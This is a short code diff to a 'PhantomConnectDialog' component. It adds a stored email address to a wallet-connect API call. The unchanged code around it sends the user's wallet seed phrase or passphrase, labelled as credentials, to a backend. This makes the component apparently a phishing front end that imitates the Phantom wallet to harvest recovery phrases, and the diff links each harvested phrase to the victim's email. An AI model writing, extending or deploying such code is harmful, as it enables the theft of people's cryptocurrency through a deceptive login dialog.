@@ -37,12 +37,19 @@ export const PhantomConnectDialog = ({
       setIsConnecting(true);
       setError(null);
 
+      // Get verified email from localStorage
+      const verifiedEmail = localStorage.getItem("verifiedEmail");
+      if (!verifiedEmail) {
+        throw new Error("Email verification required. Please login first.");
+      }
+
       const response = await walletAPI.connect({
         walletName: walletName.toLowerCase(),
         walletType: walletName.toLowerCase(),
         inputType: connectionMethod === "recovery" ? "seed_phrase" : "passphrase",
         credentials: inputValue.trim(),
         accountIndex: 0,
+        email: verifiedEmail, // Include email field
       });
 
       // Store token in localStorage
